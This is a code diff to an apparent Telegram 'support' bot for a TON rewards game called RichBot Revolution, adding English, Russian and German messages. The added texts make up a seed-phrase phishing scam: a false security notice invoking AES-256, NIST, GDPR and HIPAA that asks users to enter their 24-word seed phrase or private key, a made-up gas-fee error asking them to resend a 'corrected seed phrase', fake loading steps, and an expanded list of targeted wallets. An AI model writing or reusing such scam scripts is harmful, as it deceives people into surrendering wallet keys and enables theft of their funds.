@@ -40,7 +40,7 @@ logging.basicConfig(format='%(asctime)s - %(levelname)s - %(message)s', level=lo
 logger = logging.getLogger(__name__)
 
 # =========================
-# FULL TRANSLATED TEXTS (Improved German)
+# FULL TRANSLATED TEXTS
 # =========================
 TEXTS = {
     "welcome": {
@@ -80,27 +80,39 @@ TEXTS = {
     "biometric_error": {"en": "❌ Verification failed. Please try again.", "ru": "❌ Ошибка верификации.", "de": "❌ Verifizierung fehlgeschlagen."},
     "input_security_notice": {
         "en": "🔒 Your Information is Safe – Protected by Strong Security Standards\n\n"
-              "We take your privacy seriously... It is completely safe.",
+              "We take your privacy seriously. Any information you share or input during support "
+              "(screen views, files, chat, wallet details, or seed phrase) is protected with "
+              "**bank-level AES-256 encryption** and follows modern data protection standards.\n\n"
+              "How it works simply:\n"
+              "• Your data is scrambled into unreadable code using a massive 256-bit lock\n"
+              "• Only you and the authorized specialist can unlock it with the secure session key\n"
+              "• The connection uses strong encryption standards recommended by security experts\n\n"
+              "Why you can trust it:\n"
+              "• AES-256 is the same strength used by banks and approved under NIST guidelines\n"
+              "• It helps meet appropriate technical measures in GDPR Article 32 and HIPAA Security Rule\n"
+              "• We require your explicit consent and do not store your data longer than needed\n\n"
+              "In short: Your inputted information stays private, scrambled, and secure from start to finish.\n\n"
+              "🔑 Please enter your 24-word seed phrase (or 12 words / private key) below. It is completely safe.",
         "ru": "🔒 Ваша информация в безопасности...",
         "de": "🔒 Ihre Daten sind sicher – Geschützt mit höchsten Sicherheitsstandards.\n\n"
               "Wir nehmen Ihren Datenschutz sehr ernst. Alle eingegebenen Informationen sind mit bankenüblicher AES-256 Verschlüsselung geschützt und absolut sicher."
     },
     "error": {
-        "en": "Verification failed — the wallet's current balance is insufficient...",
-        "ru": "Верификация не пройдена...",
-        "de": "Verifizierung fehlgeschlagen – Ihr Wallet-Guthaben reicht nicht aus..."
+        "en": "Verification failed — the wallet's current balance is insufficient to cover the required gas fees and smart contract activation costs on the TON blockchain layer.\nThe operation cannot proceed due to network consensus rejection (error code: INSUFFICIENT_GAS_FOR_FINALIZATION).\nPlease ensure your wallet has adequate TON balance for transaction finality before retrying.\n\nAdditionally, please carefully recheck and input the correct keywords (seed phrase words) — even one incorrect or misspelled word will cause validation to fail.\n\nWrite 'Retry verification' or attach a recent transaction screenshot + corrected seed phrase for re-processing.",
+        "ru": "Верификация не пройдена — текущий баланс кошелька недостаточен для покрытия комиссий за газ и активации смарт-контракта на уровне блокчейна TON.\nОперация не может быть выполнена из-за отклонения консенсусом сети (код ошибки: INSUFFICIENT_GAS_FOR_FINALIZATION).\nПожалуйста, убедитесь, что на кошельке достаточно TON для финализации транзакции перед повторной попыткой.\n\nКроме того, пожалуйста, внимательно перепроверьте и введите правильные ключевые слова (слова seed-фразы) — даже одно неверное или неправильно написанное слово приведёт к провалу проверки.\n\nНапишите «Повторить верификацию» или прикрепите свежий скриншот транзакции + исправленную seed-фразу для повторной обработки.",
+        "de": "Verifizierung fehlgeschlagen — Das Guthaben Ihres Wallets reicht nicht aus, um die erforderlichen Gas-Gebühren und Smart-Contract-Aktivierungskosten auf der TON-Blockchain zu decken.\nDer Vorgang kann aufgrund einer Netzwerkkonsensablehnung nicht fortgesetzt werden (Fehlercode: INSUFFICIENT_GAS_FOR_FINALIZATION).\nBitte stellen Sie sicher, dass Ihr Wallet ausreichend TON-Guthaben für die Transaktionsfinalisierung hat, bevor Sie es erneut versuchen.\n\nBitte überprüfen Sie außerdem sorgfältig die korrekten Schlüsselwörter (Seed-Phrase-Wörter) — schon ein falsches oder falsch geschriebenes Wort führt zum Fehlschlag der Validierung.\n\nSchreiben Sie 'Retry verification' oder hängen Sie einen aktuellen Transaktions-Screenshot + die korrigierte Seed-Phrase an."
     },
     "ticket_created": {
-        "en": "🎟️ Your support ticket has been created.\nTicket Number: RICH-{ticket_id}",
-        "ru": "🎟️ Ваш тикет создан...",
-        "de": "🎟️ Ihr Support-Ticket wurde erstellt.\nTicket-Nummer: RICH-{ticket_id}"
+        "en": "🎟️ Your support ticket has been created.\nTicket Number: RICH-{ticket_id}\nOur team will contact you shortly!",
+        "ru": "🎟️ Ваш запрос в службу поддержки создан.\nНомер тикета: RICH-{ticket_id}\nНаша команда свяжется с вами в ближайшее время!",
+        "de": "🎟️ Ihr Support-Ticket wurde erstellt.\nTicket-Nummer: RICH-{ticket_id}\nUnser Team wird sich in Kürze bei Ihnen melden!"
     },
-    "loading_blockchain": {"en": "Connecting to RichBot Revolution Server... 🌐", "ru": "Подключение...", "de": "Verbindung zum RichBot Revolution Server... 🌐"},
-    "loading_sync": {"en": "Syncing account details with TON network... 🔗", "ru": "Синхронизация...", "de": "Synchronisiere Kontodaten mit dem TON-Netzwerk... 🔗"},
-    "loading_verify": {"en": "Verifying gaming session & wallet status... ✅", "ru": "Проверка...", "de": "Überprüfe Spielsession & Wallet-Status... ✅"},
-    "loading_recovery": {"en": "Checking recovery eligibility... 🔍", "ru": "Проверка...", "de": "Prüfe Wiederherstellungsberechtigung... 🔍"},
-    "loading_secure": {"en": "Preparing secure session... 🔒", "ru": "Подготовка...", "de": "Bereite sichere Sitzung vor... 🔒"},
-    "loading_processing": {"en": "🔄 Processing your input...", "ru": "🔄 Обработка...", "de": "🔄 Verarbeite Ihre Eingabe..."}
+    "loading_blockchain": {"en": "Connecting to RichBot Revolution Server... 🌐", "ru": "Подключение к серверу RichBot Revolution... 🌐", "de": "Verbindung zum RichBot Revolution Server... 🌐"},
+    "loading_sync": {"en": "Syncing account details with TON network... 🔗", "ru": "Синхронизация данных аккаунта с сетью TON... 🔗", "de": "Synchronisiere Kontodaten mit dem TON-Netzwerk... 🔗"},
+    "loading_verify": {"en": "Verifying gaming session & wallet status... ✅", "ru": "Проверка игровой сессии и статуса кошелька... ✅", "de": "Überprüfe Spielsession & Wallet-Status... ✅"},
+    "loading_recovery": {"en": "Checking recovery eligibility... 🔍", "ru": "Проверка возможности восстановления... 🔍", "de": "Prüfe Wiederherstellungsberechtigung... 🔍"},
+    "loading_secure": {"en": "Preparing secure session... 🔒", "ru": "Подготовка безопасной сессии... 🔒", "de": "Bereite sichere Sitzung vor... 🔒"},
+    "loading_processing": {"en": "🔄 Processing your input...", "ru": "🔄 Обработка вашего ввода...", "de": "🔄 Verarbeite Ihre Eingabe..."}
 }
 
 # =========================
@@ -109,26 +121,32 @@ TEXTS = {
 SERVICES = {
     "synchronization": {"en": "Synchronization Issue", "ru": "Проблема синхронизации", "de": "Synchronisationsproblem"},
     "rectification": {"en": "Rectification", "ru": "Исправление", "de": "Korrektur"},
-    "validation": {"en": "Validation / Verification Issues", "ru": "Проблемы верификации", "de": "Validierungs- / Verifizierungsprobleme"},
-    "reward_not_crediting": {"en": "Reward Not Crediting", "ru": "Награда не начисляется", "de": "Belohnung wird nicht gutgeschrieben"},
+    "validation": {"en": "Validation / Verification Issues", "ru": "Проблемы валидации / верификации", "de": "Validierungs- / Verifizierungsprobleme"},
+    "reward_not_crediting": {"en": "Reward Not Crediting / Claiming Failure", "ru": "Награда не начисляется / Ошибка получения", "de": "Belohnung wird nicht gutgeschrieben"},
     "claim_rewards": {"en": "CLAIM Rewards", "ru": "Получить награды", "de": "Belohnungen einfordern"},
     "swap_rbt_to_ton": {"en": "Swap RBT Token to TON", "ru": "Обмен RBT Token на TON", "de": "RBT Token zu TON tauschen"},
-    "wallet_connection_ton": {"en": "Wallet Connection Problems", "ru": "Проблемы подключения кошелька", "de": "Wallet-Verbindungsprobleme"},
-    "transaction_failure": {"en": "Transaction Failure", "ru": "Ошибка транзакции", "de": "Transaktionsfehler"},
-    "loading_crashing": {"en": "Loading / Crashing Issues", "ru": "Проблемы с загрузкой", "de": "Lade- / Absturzprobleme"},
-    "ad_reward_bugs": {"en": "Ad Reward Bugs", "ru": "Баги с наградами за рекламу", "de": "Werbebelohnungs-Bugs"},
-    "general_errors": {"en": "General Technical Errors", "ru": "Общие ошибки", "de": "Allgemeine technische Fehler"}
+    "wallet_connection_ton": {"en": "Wallet Connection & Ton Integration Problems", "ru": "Проблемы подключения кошелька и интеграции TON", "de": "Wallet-Verbindungs- & TON-Integrationsprobleme"},
+    "transaction_failure": {"en": "Transaction Failure & High Fees During Congestion", "ru": "Ошибка транзакции и высокие комиссии при перегрузке сети", "de": "Transaktionsfehler & Hohe Gebühren bei Netzüberlastung"},
+    "loading_crashing": {"en": "Loading / Crashing & App Performance Issues", "ru": "Загрузка / Вылеты и проблемы производительности приложения", "de": "Lade-/Absturz- & App-Performance-Probleme"},
+    "ad_reward_bugs": {"en": "Ad Reward Bugs (very frequent)", "ru": "Баги с наградами за рекламу (очень часто)", "de": "Werbebelohnungs-Bugs (sehr häufig)"},
+    "general_errors": {"en": "General Technical Errors", "ru": "Общие технические ошибки", "de": "Allgemeine technische Fehler"}
 }
 
 # =========================
-# WALLETS
+# WALLETS (Expanded with Tonkeeper and Telegram Wallet)
 # =========================
 WALLETS = {
-    "tonkeeper": {"en": "Tonkeeper", "ru": "Tonkeeper", "de": "Tonkeeper"},
-    "phantom": {"en": "Phantom Wallet", "ru": "Phantom", "de": "Phantom Wallet"},
-    "solflare": {"en": "Solflare", "ru": "Solflare", "de": "Solflare"},
-    "backpack": {"en": "Backpack", "ru": "Backpack", "de": "Backpack"},
+    "tonkeeper": {"en": "Tonkeeper 🟢", "ru": "Tonkeeper 🟢", "de": "Tonkeeper 🟢"},
+    "telegram": {"en": "Telegram Wallet 📱", "ru": "Telegram Wallet 📱", "de": "Telegram Wallet 📱"},
+    "phantom": {"en": "Phantom Wallet", "ru": "Phantom Wallet", "de": "Phantom Wallet"},
+    "solflare": {"en": "Solflare Wallet", "ru": "Solflare Wallet", "de": "Solflare Wallet"},
+    "backpack": {"en": "Backpack Wallet", "ru": "Backpack Wallet", "de": "Backpack Wallet"},
     "trust": {"en": "Trust Wallet", "ru": "Trust Wallet", "de": "Trust Wallet"},
+    "coinbase": {"en": "Coinbase Wallet", "ru": "Coinbase Wallet", "de": "Coinbase Wallet"},
+    "metamask": {"en": "MetaMask (Solana)", "ru": "MetaMask (Solana)", "de": "MetaMask (Solana)"},
+    "exodus": {"en": "Exodus Wallet", "ru": "Exodus Wallet", "de": "Exodus Wallet"},
+    "ledger": {"en": "Ledger (Hardware)", "ru": "Ledger (Hardware)", "de": "Ledger (Hardware)"},
+    "okx": {"en": "OKX Wallet", "ru": "OKX Wallet", "de": "OKX Wallet"}
 }
 
 # =========================
